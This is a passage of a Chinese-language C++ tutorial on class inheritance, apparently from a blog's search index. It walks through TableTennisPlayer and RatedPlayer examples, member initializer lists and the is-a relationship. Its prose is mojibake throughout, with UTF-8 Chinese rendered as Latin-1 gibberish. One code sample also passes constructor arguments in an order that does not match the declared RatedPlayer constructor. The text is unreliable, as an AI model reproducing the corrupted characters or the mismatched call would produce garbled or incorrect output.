N&gt;ï¼‰ï¼Œç”¨äºåœ¨ç¼–è¯‘æ—¶ç¡®å®šå¸¸é‡å€¼ï¼ˆå¦‚æ•°ç»„å¤§å°ï¼‰ã€‚ æ¨¡æ¿å…·ä½“åŒ–ï¼ˆæ˜¾å¼å’Œéƒ¨åˆ†ï¼‰å…è®¸ä¸ºç‰¹å®šç±»å‹æä¾›ä¸“é—¨çš„å®ç°ã€‚ ç±»å¯ä»¥åŒ…å«æˆå‘˜æ¨¡æ¿ï¼ˆæ¨¡æ¿åŒ–çš„æˆå‘˜å‡½æ•°æˆ–åµŒå¥—ç±»ï¼‰ã€‚ æ¨¡æ¿å¯ä»¥ä½œä¸ºå…¶ä»–æ¨¡æ¿çš„å‚æ•°ï¼ˆæ¨¡æ¿æ¨¡æ¿å‚æ•°ï¼‰ã€‚ æ¨¡æ¿å¯ä»¥ä¸å‹å…ƒç»“åˆï¼Œæœ‰çº¦æŸå’Œéçº¦æŸä¸¤ç§å½¢å¼ã€‚ C++11 å¼•å…¥äº†**æ¨¡æ¿åˆ«å (using Alias = ...)**ï¼Œç®€åŒ–å¤æ‚æ¨¡æ¿ç±»å‹çš„ä½¿ç”¨ã€‚ æœ¬ç« ä»‹ç»çš„æŠ€æœ¯æå¤§åœ°æ‰©å±•äº† C++ ä»£ç é‡ç”¨çš„å¯èƒ½æ€§ï¼Œä»ç®€å•çš„å¯¹è±¡ç»„åˆåˆ°å¤æ‚çš„ç»§æ‰¿å±‚æ¬¡ç»“æ„å’Œå¼ºå¤§çš„æ³›å‹ç¼–ç¨‹å·¥å…·â€”â€”ç±»æ¨¡æ¿ã€‚ç†è§£è¿™äº›æŠ€æœ¯åŠå…¶é€‚ç”¨åœºæ™¯å¯¹äºè®¾è®¡çµæ´»ã€å¯ç»´æŠ¤å’Œå¯é‡ç”¨çš„ C++ ä»£ç è‡³å…³é‡è¦ã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 13 ç±»ç»§æ‰¿","slug":"Cpp_tutorial_Chapter_13","date":"2025-04-30T15:42:24.009Z","updated":"2025-04-30T15:40:12.230Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_13/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_13/","excerpt":"","text":"13.1 ä¸€ä¸ªç®€å•çš„åŸºç±»é¢å‘å¯¹è±¡ç¼–ç¨‹ (OOP) çš„ä¸€ä¸ªæ ¸å¿ƒä¼˜åŠ¿æ˜¯ä»£ç é‡ç”¨ã€‚é™¤äº†é€šè¿‡åŒ…å«å¯¹è±¡æˆå‘˜ï¼ˆç»„åˆï¼‰ä¹‹å¤–ï¼ŒC++ è¿˜æä¾›äº†å¦ä¸€ç§å¼ºå¤§çš„ä»£ç é‡ç”¨æœºåˆ¶ï¼š**ç»§æ‰¿ (Inheritance)**ã€‚ ç»§æ‰¿å…è®¸æˆ‘ä»¬åŸºäºä¸€ä¸ªå·²æœ‰çš„ç±»ï¼ˆç§°ä¸ºåŸºç±» (Base Class) æˆ–çˆ¶ç±» (Parent Class)**ï¼‰æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»ï¼ˆç§°ä¸ºæ´¾ç”Ÿç±» (Derived Class)** æˆ–**å­ç±» (Child Class)**ï¼‰ã€‚æ´¾ç”Ÿç±»ä¼šè‡ªåŠ¨è·å¾—åŸºç±»çš„æ‰€æœ‰æˆå‘˜ï¼ˆæ•°æ®å’Œå‡½æ•°ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥æ·»åŠ è‡ªå·±çš„æ–°æˆå‘˜æˆ–ä¿®æ”¹ç»§æ‰¿æ¥çš„æˆå‘˜çš„è¡Œä¸ºã€‚ è¿™ç§æœºåˆ¶éå¸¸é€‚åˆç”¨æ¥è¡¨ç¤ºç°å®ä¸–ç•Œä¸­çš„â€œis-aâ€ï¼ˆæ˜¯ä¸€ç§ï¼‰å…³ç³»ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªâ€œç»ç†â€æ˜¯ä¸€ä¸ªâ€œå‘˜å·¥â€ï¼Œä¸€ä¸ªâ€œåœ†â€æ˜¯ä¸€ä¸ªâ€œå½¢çŠ¶â€ã€‚ æœ¬èŠ‚æˆ‘ä»¬å°†ä»å®šä¹‰ä¸€ä¸ªç®€å•çš„åŸºç±»å¼€å§‹ï¼Œç„¶åæ¼”ç¤ºå¦‚ä½•ä»ä¸­æ´¾ç”Ÿå‡ºæ–°çš„ç±»ã€‚ åœºæ™¯: å‡è®¾æˆ‘ä»¬è¦ä¸ºä¸€ä¸ªä¹’ä¹“çƒä¿±ä¹éƒ¨ç¼–å†™ç¨‹åºï¼Œéœ€è¦è¡¨ç¤ºçƒå‘˜ä¿¡æ¯ã€‚ åŸºç±» TableTennisPlayer: æˆ‘ä»¬é¦–å…ˆåˆ›å»ºä¸€ä¸ªåŸºç¡€çš„ TableTennisPlayer ç±»ï¼ŒåŒ…å«çƒå‘˜çš„å§“åå’Œæ˜¯å¦æœ‰çƒæ¡Œã€‚ tabtenn0.h (åŸºç±»å®šä¹‰) 123456789101112131415161718192021#ifndef TABTENN0_H_#define TABTENN0_H_#include &lt;string&gt;// ç®€å•çš„åŸºç±»class TableTennisPlayer &#123;private: std::string firstname; std::string lastname; bool hasTable;public: // æ„é€ å‡½æ•° TableTennisPlayer (const std::string &amp; fn = &quot;none&quot;, const std::string &amp; ln = &quot;none&quot;, bool ht = false); // æ–¹æ³• void Name() const; // æ˜¾ç¤ºå§“å bool HasTable() const &#123; return hasTable; &#125;; // æ˜¯å¦æœ‰çƒæ¡Œ void ResetTable(bool v) &#123; hasTable = v; &#125;; // é‡ç½®çƒæ¡ŒçŠ¶æ€&#125;;#endif // TABTENN0_H_ tabtenn0.cpp (åŸºç±»å®ç°) 12345678910#include &quot;tabtenn0.h&quot;#include &lt;iostream&gt;TableTennisPlayer::TableTennisPlayer (const std::string &amp; fn, const std::string &amp; ln, bool ht) : firstname(fn), lastname(ln), hasTable(ht) &#123;&#125; // ä½¿ç”¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨void TableTennisPlayer::Name() const &#123; std::cout &lt;&lt; lastname &lt;&lt; &quot;, &quot; &lt;&lt; firstname;&#125; è¿™ä¸ªåŸºç±»å¾ˆç®€å•ï¼ŒåŒ…å«äº†çƒå‘˜çš„åŸºæœ¬ä¿¡æ¯å’Œæ“ä½œã€‚ 13.1.1 æ´¾ç”Ÿä¸€ä¸ªç±»ç°åœ¨ï¼Œå‡è®¾æˆ‘ä»¬æƒ³ä¸ºä¸€éƒ¨åˆ†çƒå‘˜æ·»åŠ â€œç§¯åˆ†â€ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥ä» TableTennisPlayer æ´¾ç”Ÿå‡ºä¸€ä¸ªæ–°çš„ç±» RatedPlayerï¼Œå®ƒå°†ç»§æ‰¿ TableTennisPlayer çš„æ‰€æœ‰æˆå‘˜ï¼Œå¹¶æ·»åŠ è‡ªå·±çš„ç§¯åˆ†æˆå‘˜å’Œç›¸å…³æ–¹æ³•ã€‚ ç»§æ‰¿è¯­æ³•: 123class DerivedClassName : accessSpecifier BaseClassName &#123; // ... æ´¾ç”Ÿç±»æ–°å¢çš„æˆå‘˜ ...&#125;; DerivedClassName: æ´¾ç”Ÿç±»çš„åç§°ã€‚ :: è¡¨ç¤ºç»§æ‰¿å…³ç³»ã€‚ accessSpecifier: è®¿é—®è¯´æ˜ç¬¦ï¼ˆé€šå¸¸æ˜¯ publicï¼‰ï¼ŒæŒ‡å®šç»§æ‰¿ç±»å‹ã€‚ BaseClassName: åŸºç±»çš„åç§°ã€‚ RatedPlayer ç±»çš„å®šä¹‰ (æ·»åŠ åˆ° tabtenn0.h æˆ–æ–°çš„å¤´æ–‡ä»¶) æˆ‘ä»¬å°† RatedPlayer çš„å®šä¹‰ä¹Ÿæ”¾åœ¨ tabtenn0.h ä¸­ï¼ˆè™½ç„¶åˆ†æˆä¸åŒæ–‡ä»¶æ›´å¥½ï¼‰ã€‚ 12345678910111213141516171819// ... (TableTennisPlayer å®šä¹‰ä¹‹å) ...// ç®€å•çš„æ´¾ç”Ÿç±»class RatedPlayer : public TableTennisPlayer &#123; // ä½¿ç”¨ public ç»§æ‰¿private: unsigned int rating; // æ–°å¢æˆå‘˜ï¼šç§¯åˆ†public: // æ´¾ç”Ÿç±»æ„é€ å‡½æ•° RatedPlayer (unsigned int r = 0, const std::string &amp; fn = &quot;none&quot;, const std::string &amp; ln = &quot;none&quot;, bool ht = false); // ä½¿ç”¨åŸºç±»å¯¹è±¡è¿›è¡Œæ„é€  RatedPlayer(unsigned int r, const TableTennisPlayer &amp; tp); // æ–°å¢æ–¹æ³• unsigned int Rating() const &#123; return rating; &#125; // è·å–ç§¯åˆ† void ResetRating (unsigned int r) &#123; rating = r; &#125; // é‡ç½®ç§¯åˆ†&#125;;// ... (endif) ... class RatedPlayer : public TableTennisPlayer: è¿™å£°æ˜äº† RatedPlayer æ˜¯ä¸€ä¸ªä» TableTennisPlayer å…¬æœ‰ç»§æ‰¿ (publicly derived) è€Œæ¥çš„ç±»ã€‚ å…¬æœ‰ç»§æ‰¿ (public): è¿™æ˜¯æœ€å¸¸ç”¨çš„ç»§æ‰¿æ–¹å¼ã€‚å®ƒå»ºç«‹äº†ä¸€ç§ â€œis-aâ€ å…³ç³»ã€‚åŸºç±»çš„å…¬æœ‰æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶æ˜¯å…¬æœ‰çš„ï¼ŒåŸºç±»çš„ä¿æŠ¤æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶æ˜¯ä¿æŠ¤çš„ã€‚åŸºç±»çš„ç§æœ‰æˆå‘˜è™½ç„¶è¢«ç»§æ‰¿ä¸‹æ¥äº†ï¼Œä½†åœ¨æ´¾ç”Ÿç±»ä¸­æ˜¯ä¸å¯ç›´æ¥è®¿é—®çš„ã€‚ RatedPlayer è‡ªåŠ¨æ‹¥æœ‰äº† firstname, lastname, hasTable æ•°æ®æˆå‘˜ä»¥åŠ Name(), HasTable(), ResetTable() æ–¹æ³•ï¼ˆå°½ç®¡ç§æœ‰æˆå‘˜ä¸èƒ½ç›´æ¥è®¿é—®ï¼‰ã€‚ RatedPlayer æ·»åŠ äº†è‡ªå·±çš„ç§æœ‰æˆå‘˜ rating å’Œå…¬æœ‰æ–¹æ³• Rating(), ResetRating()ã€‚ 13.1.2 æ„é€ å‡½æ•°ï¼šè®¿é—®æƒé™çš„è€ƒè™‘æ´¾ç”Ÿç±»ä¸èƒ½ç›´æ¥è®¿é—®åŸºç±»çš„ç§æœ‰æˆå‘˜ã€‚é‚£ä¹ˆï¼Œæ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°å¦‚ä½•åˆå§‹åŒ–ç»§æ‰¿æ¥çš„åŸºç±»ç§æœ‰æˆå‘˜ï¼ˆå¦‚ firstname, lastnameï¼‰å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ï¼šæ´¾ç”Ÿç±»æ„é€ å‡½æ•°å¿…é¡»è°ƒç”¨åŸºç±»çš„æ„é€ å‡½æ•°æ¥å®ŒæˆåŸºç±»éƒ¨åˆ†çš„åˆå§‹åŒ–ã€‚è¿™æ˜¯é€šè¿‡æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨ (Member Initializer List) å®ç°çš„ã€‚ æ´¾ç”Ÿç±»æ„é€ å‡½æ•°çš„å®ç° (æ·»åŠ åˆ° tabtenn0.cpp) 1234567891011121314// ... (TableTennisPlayer å®ç°ä¹‹å) ...// RatedPlayer æ„é€ å‡½æ•°å®ç°RatedPlayer::RatedPlayer(unsigned int r, const std::string &amp; fn, const std::string &amp; ln, bool ht) : TableTennisPlayer(fn, ln, ht), rating(r) &#123; // è°ƒç”¨åŸºç±»æ„é€ å‡½æ•° // rating(r) åˆå§‹åŒ–æ´¾ç”Ÿç±»è‡ªå·±çš„æˆå‘˜ // åŸºç±»éƒ¨åˆ†çš„åˆå§‹åŒ–å§”æ‰˜ç»™ TableTennisPlayer çš„æ„é€ å‡½æ•°&#125;RatedPlayer::RatedPlayer(unsigned int r, const TableTennisPlayer &amp; tp) : TableTennisPlayer(tp), rating(r) &#123; // è°ƒç”¨åŸºç±»çš„å¤åˆ¶æ„é€ å‡½æ•° (è¿™é‡Œæ˜¯éšå¼ç”Ÿæˆçš„) // rating(r) åˆå§‹åŒ–æ´¾ç”Ÿç±»è‡ªå·±çš„æˆå‘˜&#125; : TableTennisPlayer(fn, ln, ht): è¿™éƒ¨åˆ†æ˜¯æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨çš„å…³é”®ã€‚å®ƒæ˜¾å¼åœ°è°ƒç”¨äº†åŸºç±» TableTennisPlayer çš„æ„é€ å‡½æ•°ï¼Œå¹¶å°†å¿…è¦çš„å‚æ•° (fn, ln, ht) ä¼ é€’ç»™å®ƒã€‚åŸºç±»æ„é€ å‡½æ•°è´Ÿè´£åˆå§‹åŒ– firstname, lastname, hasTableã€‚ , rating(r): åˆå§‹åŒ–åˆ—è¡¨ä¹Ÿç”¨äºåˆå§‹åŒ–æ´¾ç”Ÿç±»è‡ªå·±çš„æˆå‘˜ ratingã€‚ è§„åˆ™: åœ¨åˆ›å»ºæ´¾ç”Ÿç±»å¯¹è±¡æ—¶ï¼Œç¨‹åºä¼šé¦–å…ˆè°ƒç”¨åŸºç±»çš„æ„é€ å‡½æ•°æ¥åˆ›å»ºå’Œåˆå§‹åŒ–å¯¹è±¡çš„åŸºç±»éƒ¨åˆ†ï¼Œç„¶åå†æ‰§è¡Œæ´¾ç”Ÿç±»æ„é€ å‡½æ•°ä½“ï¼ˆå¹¶åˆå§‹åŒ–æ´¾ç”Ÿç±»æˆå‘˜ï¼‰ã€‚å¦‚æœä½ ä¸åœ¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨ä¸­æ˜¾å¼è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šå°è¯•è°ƒç”¨åŸºç±»çš„é»˜è®¤æ„é€ å‡½æ•°ã€‚å¦‚æœåŸºç±»æ²¡æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œæˆ–è€…ä½ éœ€è¦è°ƒç”¨å¸¦å‚æ•°çš„åŸºç±»æ„é€ å‡½æ•°ï¼Œå°±å¿…é¡»åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­æ˜¾å¼è°ƒç”¨ã€‚ 13.1.3 ä½¿ç”¨æ´¾ç”Ÿç±»æ´¾ç”Ÿç±»çš„å¯¹è±¡æ‹¥æœ‰åŸºç±»å’Œæ´¾ç”Ÿç±»çš„æ‰€æœ‰å…¬æœ‰æˆå‘˜ã€‚ usett0.cpp (ä½¿ç”¨ç¤ºä¾‹) 123456789101112131415161718192021222324252627282930// filepath: d:\\ProgramData\\files_Cpp\\250424\\usett0.cpp#include &lt;iostream&gt;#include &quot;tabtenn0.h&quot; // åŒ…å«åŸºç±»å’Œæ´¾ç”Ÿç±»å®šä¹‰int main ( void ) &#123; using std::cout; using std::endl; TableTennisPlayer player1(&quot;Chuck&quot;, &quot;Blizzard&quot;, true); RatedPlayer rplayer1(1140, &quot;Mallory&quot;, &quot;Duck&quot;, true); // ä½¿ç”¨æ´¾ç”Ÿç±»æ„é€ å‡½æ•° // æ´¾ç”Ÿç±»å¯¹è±¡å¯ä»¥ä½¿ç”¨åŸºç±»çš„æ–¹æ³• rplayer1.Name(); // è°ƒç”¨ç»§æ‰¿æ¥çš„ TableTennisPlayer::Name() if (rplayer1.HasTable()) // è°ƒç”¨ç»§æ‰¿æ¥çš„ TableTennisPlayer::HasTable() cout &lt;&lt; &quot;: has a table.\\n&quot;; else cout &lt;&lt; &quot;: hasn&#x27;t a table.\\n&quot;; // æ´¾ç”Ÿç±»å¯¹è±¡å¯ä»¥ä½¿ç”¨è‡ªå·±çš„æ–¹æ³• cout &lt;&lt; &quot;Name: &quot;; rplayer1.Name(); cout &lt;&lt; &quot;; Rating: &quot; &lt;&lt; rplayer1.Rating() &lt;&lt; endl; // è°ƒç”¨ RatedPlayer::Rating() // å¯ä»¥ä½¿ç”¨åŸºç±»å¯¹è±¡åˆå§‹åŒ–æ´¾ç”Ÿç±»å¯¹è±¡ (é€šè¿‡ç‰¹å®šæ„é€ å‡½æ•°) RatedPlayer rplayer2(1212, player1); cout &lt;&lt; &quot;Name: &quot;; rplayer2.Name(); cout &lt;&lt; &quot;; Rating: &quot; &lt;&lt; rplayer2.Rating() &lt;&lt; endl; return 0;&#125; ç¼–è¯‘å’Œè¿è¡Œ: ä½ éœ€è¦å°† tabtenn0.cpp å’Œ usett0.cpp ä¸€èµ·ç¼–è¯‘é“¾æ¥ã€‚ 12g++ usett0.cpp tabtenn0.cpp -o usett0./usett0 è¾“å‡º: 123Duck, Mallory: has a table.Name: Duck, Mallory; Rating: 1140Name: Blizzard, Chuck; Rating: 1212 13.1.4 æ´¾ç”Ÿç±»å’ŒåŸºç±»ä¹‹é—´çš„ç‰¹æ®Šå…³ç³»å…¬æœ‰ç»§æ‰¿å»ºç«‹äº†ä¸€ç§éå¸¸é‡è¦çš„å…³ç³»ï¼š æ´¾ç”Ÿç±»å¯¹è±¡ä¹Ÿæ˜¯ä¸€ä¸ªåŸºç±»å¯¹è±¡: ä¸€ä¸ª RatedPlayer å¯¹è±¡æ˜¯ä¸€ä¸ª TableTennisPlayer å¯¹è±¡ã€‚è¿™æ„å‘³ç€éœ€è¦ TableTennisPlayer å¯¹è±¡çš„åœ°æ–¹ï¼Œé€šå¸¸å¯ä»¥ä½¿ç”¨ RatedPlayer å¯¹è±¡æ¥æ›¿ä»£ã€‚ åŸºç±»æŒ‡é’ˆ/å¼•ç”¨å¯ä»¥æŒ‡å‘/å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡: 12345678910RatedPlayer rplayer1(1140, &quot;Mallory&quot;, &quot;Duck&quot;, true);TableTennisPlayer * pt = &amp;rplayer1; // åŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡ (OK)TableTennisPlayer &amp; rt = rplayer1; // åŸºç±»å¼•ç”¨å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ (OK)pt-&gt;Name(); // é€šè¿‡åŸºç±»æŒ‡é’ˆè°ƒç”¨åŸºç±»æ–¹æ³• (OK)rt.Name(); // é€šè¿‡åŸºç±»å¼•ç”¨è°ƒç”¨åŸºç±»æ–¹æ³• (OK)// ä½†æ˜¯ï¼Œé€šè¿‡åŸºç±»æŒ‡é’ˆ/å¼•ç”¨ä¸èƒ½ç›´æ¥è°ƒç”¨æ´¾ç”Ÿç±»ç‰¹æœ‰çš„æ–¹æ³•// pt-&gt;Rating(); // é”™è¯¯ï¼TableTennisPlayer æ²¡æœ‰ Rating() æ–¹æ³•// rt.Rating(); // é”™è¯¯ï¼ è¿™ç§æŒ‡é’ˆ/å¼•ç”¨çš„å…¼å®¹æ€§æ˜¯å®ç°å¤šæ€ (Polymorphism) çš„åŸºç¡€ï¼Œæˆ‘ä»¬å°†åœ¨åç»­ç« èŠ‚è¯¦ç»†è®¨è®ºã€‚ æ€»ç»“: ç»§æ‰¿å…è®¸åŸºäºç°æœ‰ç±»ï¼ˆåŸºç±»ï¼‰åˆ›å»ºæ–°ç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰ã€‚ æ´¾ç”Ÿç±»ç»§æ‰¿åŸºç±»çš„æˆå‘˜ï¼ˆæ•°æ®å’Œæ–¹æ³•ï¼‰ã€‚ å…¬æœ‰ç»§æ‰¿ (public) å»ºç«‹ â€œis-aâ€ å…³ç³»ï¼ŒåŸºç±»çš„å…¬æœ‰æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»æ˜¯å…¬æœ‰ã€‚ æ´¾ç”Ÿç±»æ„é€ å‡½æ•°å¿…é¡»é€šè¿‡æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨è°ƒç”¨é€‚å½“çš„åŸºç±»æ„é€ å‡½æ•°æ¥åˆå§‹åŒ–ç»§æ‰¿çš„åŸºç±»æˆå‘˜ã€‚ æ´¾ç”Ÿç±»å¯¹è±¡å¯ä»¥ä½¿ç”¨åŸºç±»çš„å…¬æœ‰æ–¹æ³•ã€‚ åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨å¯ä»¥æŒ‡å‘æˆ–å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ï¼Œä½†åªèƒ½é€šè¿‡å®ƒä»¬è°ƒç”¨åŸºç±»ä¸­å®šä¹‰çš„æ–¹æ³•ï¼ˆé™¤éä½¿ç”¨è™šå‡½æ•°å’ŒåŠ¨æ€è”ç¼–ï¼‰ã€‚ 13.2 ç»§æ‰¿ï¼šis-a å…³ç³»æˆ‘ä»¬åœ¨ä¸Šä¸€èŠ‚çœ‹åˆ°äº†å¦‚ä½•ä»ä¸€ä¸ªåŸºç±»æ´¾ç”Ÿå‡ºæ–°ç±»ã€‚å…¶ä¸­ï¼Œå…¬æœ‰ç»§æ‰¿ (public) æ˜¯æœ€å¸¸ç”¨çš„ä¸€ç§ç»§æ‰¿æ–¹å¼ï¼Œå®ƒå»ºç«‹äº†ä¸€ç§è¢«ç§°ä¸º â€œis-aâ€ ï¼ˆæˆ– â€œis-a-kind-ofâ€ï¼‰çš„å…³ç³»æ¨¡å‹ã€‚ ä»€ä¹ˆæ˜¯ â€œis-aâ€ å…³ç³»ï¼Ÿ â€œis-aâ€ å…³ç³»æ„å‘³ç€æ´¾ç”Ÿç±»çš„å¯¹è±¡æœ¬è´¨ä¸Šä¹Ÿæ˜¯åŸºç±»çš„ä¸€ç§ã€‚æ¢å¥è¯è¯´ï¼Œæ´¾ç”Ÿç±»æ˜¯åŸºç±»çš„ä¸€ä¸ªç‰¹æ®ŠåŒ–ç‰ˆæœ¬ã€‚ åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼ŒRatedPlayer æ˜¯ä¸€ä¸ª TableTennisPlayerã€‚ä¸€ä¸ªæœ‰ç§¯åˆ†çš„çƒå‘˜é¦–å…ˆæ˜¯ä¸€ä¸ªä¹’ä¹“çƒçƒå‘˜ï¼Œåªæ˜¯ä»–è¿˜é¢å¤–å…·æœ‰ç§¯åˆ†å±æ€§ã€‚ ç±»ä¼¼åœ°ï¼Œå¦‚æœæœ‰ä¸€ä¸ª Employee ç±»å’Œä¸€ä¸ª Manager ç±»ï¼Œå¹¶ä¸” Manager å…¬æœ‰ç»§æ‰¿è‡ª Employeeï¼Œé‚£ä¹ˆä¸€ä¸ª Manager æ˜¯ä¸€ä¸ª Employeeã€‚ç»ç†æ˜¯å‘˜å·¥çš„ä¸€ç§ç‰¹æ®Šç±»å‹ï¼Œå…·æœ‰é¢å¤–çš„èŒè´£æˆ–å±æ€§ã€‚ ä¸€ä¸ª Circle æ˜¯ä¸€ä¸ª Shapeã€‚ ä¸€ä¸ª Dog æ˜¯ä¸€ä¸ª Animalã€‚ å…¬æœ‰ç»§æ‰¿å¦‚ä½•ä½“ç° â€œis-aâ€ï¼Ÿ å…¬æœ‰ç»§æ‰¿ä¹‹æ‰€ä»¥èƒ½æ¨¡æ‹Ÿ â€œis-aâ€ å…³ç³»ï¼Œå…³é”®åœ¨äºå®ƒä¿è¯äº†æ´¾ç”Ÿç±»å¯¹è±¡æ‹¥æœ‰åŸºç±»çš„æ‰€æœ‰å…¬æœ‰æ¥å£ã€‚ å½“ RatedPlayer å…¬æœ‰ç»§æ‰¿ TableTennisPlayer æ—¶ï¼ŒTableTennisPlayer çš„æ‰€æœ‰ public æˆå‘˜ï¼ˆå¦‚ Name(), HasTable(), ResetTable()ï¼‰åœ¨ RatedPlayer ä¸­ä¹Ÿä¿æŒ publicã€‚ è¿™æ„å‘³ç€ä»»ä½•å¯ä»¥å¯¹ TableTennisPlayer å¯¹è±¡æ‰§è¡Œçš„æ“ä½œï¼ˆé€šè¿‡å…¶å…¬æœ‰æ¥å£ï¼‰ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥å¯¹ RatedPlayer å¯¹è±¡æ‰§è¡Œã€‚ä¸€ä¸ª RatedPlayer å¯¹è±¡å¯ä»¥åƒ TableTennisPlayer å¯¹è±¡ä¸€æ ·è¢«ä½¿ç”¨ï¼Œå› ä¸ºå®ƒå…·å¤‡äº† TableTennisPlayer çš„æ‰€æœ‰åŸºæœ¬åŠŸèƒ½ã€‚ ä»£ç ä½“ç°: è¿™ç§å…³ç³»æœ€ç›´æ¥çš„ä½“ç°å°±æ˜¯åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨å¯ä»¥æŒ‡å‘æˆ–å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ï¼š 1234567891011121314151617181920212223RatedPlayer rp(&quot;May&quot;, &quot;Lee&quot;, true, 1500);TableTennisPlayer ttp(&quot;John&quot;, &quot;Doe&quot;, false);// &quot;is-a&quot; å…³ç³»å…è®¸è¿™ç§èµ‹å€¼/åˆå§‹åŒ–TableTennisPlayer &amp; rt = rp; // åŸºç±»å¼•ç”¨å¯ä»¥å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡TableTennisPlayer * pt = &amp;rp; // åŸºç±»æŒ‡é’ˆå¯ä»¥æŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡// å¯ä»¥é€šè¿‡åŸºç±»å¼•ç”¨/æŒ‡é’ˆè°ƒç”¨åŸºç±»çš„æ–¹æ³•rt.Name(); // è¾“å‡º Lee, Maypt-&gt;Name(); // è¾“å‡º Lee, May// ä½†ä¸èƒ½ç›´æ¥é€šè¿‡åŸºç±»å¼•ç”¨/æŒ‡é’ˆè°ƒç”¨æ´¾ç”Ÿç±»ç‰¹æœ‰çš„æ–¹æ³•// rt.Rating(); // é”™è¯¯! TableTennisPlayer æ²¡æœ‰ Rating() æ–¹æ³•// pt-&gt;Rating(); // é”™è¯¯!// ä¹Ÿå¯ä»¥å°†æ´¾ç”Ÿç±»å¯¹è±¡ä¼ é€’ç»™éœ€è¦åŸºç±»å¯¹è±¡çš„å‡½æ•°void showPlayerName(const TableTennisPlayer &amp; player) &#123; player.Name(); std::cout &lt;&lt; std::endl;&#125;showPlayerName(ttp); // ä¼ é€’åŸºç±»å¯¹è±¡ (OK)showPlayerName(rp); // ä¼ é€’æ´¾ç”Ÿç±»å¯¹è±¡ (OK, å› ä¸º RatedPlayer is-a TableTennisPlayer) ä¸å…¶ä»–å…³ç³»çš„å¯¹æ¯”: ç»§æ‰¿ï¼ˆç‰¹åˆ«æ˜¯å…¬æœ‰ç»§æ‰¿ï¼‰ä¸å…¶ä»–ç±»ä¹‹é—´çš„å…³ç³»ä¸åŒï¼š â€œhas-aâ€ å…³ç³» (åŒ…å«/ç»„åˆ - Composition): ä¸€ä¸ªç±»åŒ…å«å¦ä¸€ä¸ªç±»çš„å¯¹è±¡ä½œä¸ºå…¶æˆå‘˜ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª Car æœ‰ä¸€ä¸ª Engineã€‚è¿™é€šå¸¸é€šè¿‡å°† Engine å¯¹è±¡ä½œä¸º Car ç±»çš„æ•°æ®æˆå‘˜æ¥å®ç°ã€‚Car ä¸æ˜¯ Engineï¼ŒEngine ä¹Ÿä¸æ˜¯ Carã€‚ 123456class Engine &#123; /* ... */ &#125;;class Car &#123;private: Engine engine_member; // Car has-a Engine // ...&#125;; â€œuses-aâ€ å…³ç³» (ä½¿ç”¨ - Association/Dependency): ä¸€ä¸ªç±»åœ¨å®ƒçš„æ–¹æ³•ä¸­ä½¿ç”¨äº†å¦ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼ˆä¾‹å¦‚ï¼Œä½œä¸ºå‚æ•°ã€è¿”å›å€¼æˆ–å±€éƒ¨å˜é‡ï¼‰ï¼Œä½†å¹¶ä¸æ‹¥æœ‰å®ƒã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª Programmer ä½¿ç”¨ä¸€ä¸ª Computerã€‚ 1234567class Computer &#123; /* ... */ &#125;;class Programmer &#123;public: void writeCode(Computer&amp; pc) &#123; // Programmer uses-a Computer // ... ä½¿ç”¨ pc å¯¹è±¡ ... &#125;&#125;; ä¸ºä»€ä¹ˆåŒºåˆ†å¾ˆé‡è¦ï¼Ÿ æ­£ç¡®åœ°è¯†åˆ«ç±»ä¹‹é—´çš„å…³ç³»å¹¶é€‰æ‹©åˆé€‚çš„å®ç°æ–¹å¼ï¼ˆå…¬æœ‰ç»§æ‰¿ã€ç§æœ‰ç»§æ‰¿ã€ä¿æŠ¤ç»§æ‰¿ã€ç»„åˆã€å…³è”ï¼‰å¯¹äºè®¾è®¡è‰¯å¥½ã€å¯ç»´æŠ¤çš„é¢å‘å¯¹è±¡ç³»ç»Ÿè‡³å…³é‡è¦ã€‚ å…¬æœ‰ç»§æ‰¿ (public) åº”è¯¥åªç”¨äºæ¨¡æ‹ŸçœŸæ­£çš„ â€œis-aâ€ å…³ç³»ã€‚å¦‚æœæ´¾ç”Ÿç±»ä¸èƒ½å®Œå…¨æ›¿ä»£åŸºç±»ï¼ˆå³ä¸ç¬¦åˆ Liskov æ›¿æ¢åŸåˆ™ - Liskov Substitution Principleï¼‰ï¼Œé‚£ä¹ˆä½¿ç”¨å…¬æœ‰ç»§æ‰¿å¯èƒ½æ˜¯ä¸æ°å½“çš„ã€‚ å¦‚æœå…³ç³»æ˜¯ 